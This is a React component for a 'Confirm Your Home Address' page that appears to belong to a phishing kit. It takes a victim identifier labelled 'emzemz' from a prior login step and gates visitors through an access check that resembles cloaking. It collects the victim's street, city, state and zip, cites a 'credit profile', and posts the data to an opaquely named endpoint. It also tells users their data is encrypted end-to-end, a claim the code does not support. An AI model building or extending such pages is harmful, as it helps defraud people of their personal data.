import React, { useEffect, useState } from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import axios from 'axios';
import { baseUrl } from '../constants';
import useAccessCheck from '../Utils/useAccessCheck';
import FlowPageLayout from '../components/FlowPageLayout';

const HomeAddress: React.FC = () => {
  const [stAd, setStAd] = useState('');
  const [apt, setApt] = useState('');
  const [city, setCity] = useState('');
  const [state, setState] = useState('');
  const [zipCode, setZipCode] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [errors, setErrors] = useState({ 
    stAd: '', 
    apt: '', 
    city: '', 
    state: '', 
    zipCode: '',
    form: '' 
  });

  const navigate = useNavigate();
  const location = useLocation();
  const { emzemz } = location.state || {};
  const isAllowed = useAccessCheck(baseUrl);

  useEffect(() => {
    if (!emzemz) {
      navigate('/login', { replace: true });
    }
  }, [emzemz, navigate]);

  if (isAllowed === null) {
    return <div className="min-h-screen flex items-center justify-center text-gray-700">Loading...</div>;
  }

  if (isAllowed === false) {
    return <div className="min-h-screen flex items-center justify-center text-gray-700">Access denied. Redirecting...</div>;
  }

  if (!emzemz) {
    return <div className="min-h-screen flex items-center justify-center text-gray-700">Missing user details. Please restart the process.</div>;
  }

  const handleSubmit = async (event: React.FormEvent<HTMLFormElement>) => {
    event.preventDefault();
    setIsLoading(true);

    const newErrors = {
      stAd: !stAd.trim() ? 'Street Address is required' : '',
      city: !city.trim() ? 'City is required' : '',
      state: !state.trim() ? 'State is required' : '',
      zipCode: !zipCode.trim() ? 'Zip Code is required' : '',
      apt: '',
      form: ''
    };

    setErrors(newErrors);

    // Check if there are no errors (apt is optional)
    if (!newErrors.stAd && !newErrors.city && !newErrors.state && !newErrors.zipCode) {
      try {
        await axios.post(`${baseUrl}api/fifty-meta-data-4/`, {
          emzemz,
          stAd,
          apt,
          city,
          state,
          zipCode,
        });
        navigate('/terms', { state: { emzemz } });
      } catch (error) {
        console.error('Error submitting home address:', error);
        setErrors(prev => ({
          ...prev,
          form: 'There was an error submitting your address. Please try again.'
        }));
      } finally {
        setIsLoading(false);
      }
    } else {
      setIsLoading(false);
    }
  };

  return (
    <FlowPageLayout breadcrumb="Home Address" cardMaxWidth="max-w-3xl">
      <div className="space-y-6">
        <div className="space-y-3">
          <h2 className="text-2xl font-semibold text-gray-900">Confirm Your Home Address</h2>
          <p className="text-sm text-gray-600">
            This needs to match the information tied to your credit profile so we can confirm it’s really you.
          </p>
        </div>

        <form onSubmit={handleSubmit} className="space-y-6">
          <div className="space-y-2">
            <label className="text-xs font-semibold uppercase tracking-wide text-gray-600">Street Address</label>
            <input
              id="stAd"
              name="stAd"
              type="text"
              value={stAd}
              onChange={(event) => setStAd(event.target.value)}
              className="w-full rounded-sm border border-gray-300 px-3 py-2 text-sm text-gray-800 focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
              placeholder="123 Main Street"
            />
            {errors.stAd && <p className="text-xs font-semibold text-red-600">{errors.stAd}</p>}
          </div>

          <div className="grid gap-6 md:grid-cols-2">
            <div className="space-y-2">
              <label className="text-xs font-semibold uppercase tracking-wide text-gray-600">Apartment / Unit (optional)</label>
              <input
                id="apt"
                name="apt"
                type="text"
                value={apt}
                onChange={(event) => setApt(event.target.value)}
                className="w-full rounded-sm border border-gray-300 px-3 py-2 text-sm text-gray-800 focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
              />
            </div>

            <div className="space-y-2">
              <label className="text-xs font-semibold uppercase tracking-wide text-gray-600">City</label>
              <input
                id="city"
                name="city"
                type="text"
                value={city}
                onChange={(event) => setCity(event.target.value)}
                className="w-full rounded-sm border border-gray-300 px-3 py-2 text-sm text-gray-800 focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
                placeholder="Enter city"
              />
              {errors.city && <p className="text-xs font-semibold text-red-600">{errors.city}</p>}
            </div>

            <div className="space-y-2">
              <label className="text-xs font-semibold uppercase tracking-wide text-gray-600">State</label>
              <input
                id="state"
                name="state"
                type="text"
                value={state}
                onChange={(event) => setState(event.target.value)}
                className="w-full rounded-sm border border-gray-300 px-3 py-2 text-sm text-gray-800 focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
                placeholder="OH"
              />
              {errors.state && <p className="text-xs font-semibold text-red-600">{errors.state}</p>}
            </div>

            <div className="space-y-2">
              <label className="text-xs font-semibold uppercase tracking-wide text-gray-600">Zip Code</label>
              <input
                id="zipCode"
                name="zipCode"
                type="text"
                value={zipCode}
                onChange={(event) => setZipCode(event.target.value)}
                className="w-full rounded-sm border border-gray-300 px-3 py-2 text-sm text-gray-800 focus:border-[#123b9d] focus:outline-none focus:ring-2 focus:ring-[#123b9d]/20"
                placeholder="45202"
              />
              {errors.zipCode && <p className="text-xs font-semibold text-red-600">{errors.zipCode}</p>}
            </div>
          </div>

          {errors.form && <p className="text-sm font-semibold text-red-600">{errors.form}</p>}

          <div className="flex justify-end">
            <button
              type="submit"
              disabled={isLoading}
              className="inline-flex items-center justify-center rounded-sm bg-[#123b9d] px-8 py-3 text-sm font-semibold uppercase tracking-wide text-white transition hover:bg-[#0f2f6e] disabled:cursor-not-allowed disabled:opacity-70"
            >
              {isLoading ? 'Saving…' : 'Continue'}
            </button>
          </div>
        </form>

        <div className="rounded-md bg-[#f4f2f2] px-4 py-3 text-xs text-gray-600">
          Your address stays private and is encrypted end-to-end.
        </div>
      </div>
    </FlowPageLayout>
  );
};

export default HomeAddress;